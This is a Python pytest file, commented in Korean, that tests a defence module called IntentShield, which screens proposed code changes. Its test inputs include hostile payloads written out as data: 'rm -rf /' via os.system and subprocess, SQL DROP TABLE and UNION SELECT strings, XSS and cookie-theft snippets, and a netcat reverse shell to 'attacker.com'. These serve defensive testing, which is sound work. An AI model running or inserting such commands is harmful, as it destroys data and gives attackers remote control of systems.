"""RC9: IntentShield 이중 평면 격리 방어 테스트

검증 항목:
  - Protocol 준수 (RootCauseDefense)
  - 셸 인젝션 차단 (rm -rf, subprocess, powershell 등)
  - SQL 인젝션 차단 (DROP TABLE, UNION SELECT 등)
  - XSS 차단 (<script>, document.cookie 등)
  - 역방향 셸 차단 (nc -e, socket, pty.spawn 등)
  - 정상 코드 수정 통과
  - 잘못된 입력 타입 거부 (fail-closed)
  - dict / str / Pydantic 모델 입력 지원

주의: IntentShield는 내부 rate limiter(0.5s)가 있으므로
각 테스트 간 time.sleep(0.6) 필요.
"""

import time

import pytest

from denavy.protocols import DefenseVerdict, RootCauseDefense
from denavy.rc9_security_collapse.intent_shield_defense import (
    IntentShieldDefense,
)


# ──────────────────────────────────────────────
# 공유 fixture — IntentShield 인스턴스 (테스트 세션당 1개)
# ──────────────────────────────────────────────

@pytest.fixture(scope="module")
def defense():
    """IntentShield 방어 모듈 인스턴스.
    data_dir을 임시 경로에 두어 테스트 격리.
    """
    import tempfile
    tmp = tempfile.mkdtemp(prefix="denavy_rc9_test_")
    d = IntentShieldDefense(data_dir=tmp)
    return d


def _wait():
    """IntentShield rate limiter 회피 (0.5s 간격)."""
    time.sleep(0.6)


# ──────────────────────────────────────────────
# 유틸리티: 테스트 데이터 생성
# ──────────────────────────────────────────────

def _make_intent(
    action: str = "modify",
    target_file: str = "src/main.py",
    reasoning: str = "기존 함수의 반환 타입을 수정합니다",
    new_content: str = "def foo() -> str | None:\n    return None",
) -> dict:
    """IntentionPayload 스타일의 dict를 생성."""
    return {
        "action": action,
        "target_file": target_file,
        "reasoning": reasoning,
        "code_changes": [
            {
                "target_line_start": 1,
                "target_line_end": 2,
                "original_content": "def foo() -> str:",
                "new_content": new_content,
                "rationale": "타입 안정성 개선을 위한 Optional 반영",
            }
        ],
    }


# ──────────────────────────────────────────────
# Protocol 준수 테스트
# ──────────────────────────────────────────────

class TestProtocolCompliance:
    def test_implements_protocol(self, defense):
        assert isinstance(defense, RootCauseDefense)

    def test_root_cause_id(self, defense):
        assert defense.root_cause_id == 9

    def test_target_defects(self, defense):
        assert defense.target_defects == [19]

    def test_is_enabled(self, defense):
        assert defense.is_enabled() is True


# ──────────────────────────────────────────────
# 정상 코드 통과 테스트
# ──────────────────────────────────────────────

class TestSafeActions:
    def test_normal_code_modify_passes(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="x: int = 42\ny: str = 'hello'",
        ))
        assert result.passed, f"거부 사유: {result.reason}"

    def test_normal_delete_intent(self, defense):
        """DELETE_FILE은 CoreSafety에서 차단됨 (ALLOW_FILE_DELETION=False)."""
        _wait()
        result = defense.validate(_make_intent(action="delete"))
        # IntentShield는 DELETE_FILE을 영구 차단함
        assert result.rejected

    def test_string_input_passes(self, defense):
        """안전한 문자열은 THINK 액션으로 통과."""
        _wait()
        result = defense.validate("이 함수를 리팩토링해야 합니다")
        assert result.passed, f"거부 사유: {result.reason}"


# ──────────────────────────────────────────────
# 셸 인젝션 차단 테스트
# ──────────────────────────────────────────────

class TestShellInjection:
    def test_rm_rf_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="import os; os.system('rm -rf /')",
        ))
        assert result.rejected
        # CoreSafety detects either "os.system" or "rm -rf" as malicious syntax
        reason_lower = result.reason.lower()
        assert "malicious" in reason_lower or "os.system" in reason_lower or "rm -rf" in reason_lower

    def test_subprocess_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="subprocess.call(['rm', '-rf', '/'])",
        ))
        assert result.rejected

    def test_powershell_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="powershell -nop -c 'Get-ChildItem'",
        ))
        assert result.rejected


# ──────────────────────────────────────────────
# SQL 인젝션 차단 테스트
# ──────────────────────────────────────────────

class TestSQLInjection:
    def test_drop_table_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="cursor.execute('DROP TABLE users')",
        ))
        assert result.rejected

    def test_union_select_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="query = 'UNION SELECT * FROM passwords'",
        ))
        assert result.rejected


# ──────────────────────────────────────────────
# XSS 차단 테스트
# ──────────────────────────────────────────────

class TestXSSInjection:
    def test_script_tag_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="html = '<script>alert(1)</script>'",
        ))
        assert result.rejected

    def test_document_cookie_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="steal = document.cookie",
        ))
        assert result.rejected


# ──────────────────────────────────────────────
# 역방향 셸 차단 테스트
# ──────────────────────────────────────────────

class TestReverseShell:
    def test_nc_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="os.popen('nc -e /bin/sh attacker.com 4444')",
        ))
        assert result.rejected

    def test_pty_spawn_blocked(self, defense):
        _wait()
        result = defense.validate(_make_intent(
            new_content="import pty; pty.spawn('/bin/sh')",
        ))
        assert result.rejected


# ──────────────────────────────────────────────
# Fail-closed 테스트
# ──────────────────────────────────────────────

class TestFailClosed:
    def test_invalid_type_rejected(self, defense):
        """지원하지 않는 타입은 fail-closed로 거부."""
        _wait()
        result = defense.validate(12345)
        assert result.rejected

    def test_none_rejected(self, defense):
        _wait()
        result = defense.validate(None)
        assert result.rejected
